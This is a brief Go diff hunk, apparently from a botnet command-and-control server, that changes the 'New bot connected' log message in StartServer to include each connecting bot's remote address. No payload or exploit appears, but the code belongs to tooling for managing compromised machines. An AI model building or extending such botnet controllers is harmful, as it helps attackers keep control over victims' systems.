@@ -38,7 +38,8 @@ func StartServer(c *config.Config) {
 		select {
 		case conn := <-Chconn:
 			Conns = append(Conns, conn)
-			color.HiYellow("[!] New bot connected")
+			addr := conn.RemoteAddr()
+			color.HiYellow("[!] New bot connected: " + addr.String())
 			// if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
 			// 	newbot(addr.String())
 			// }
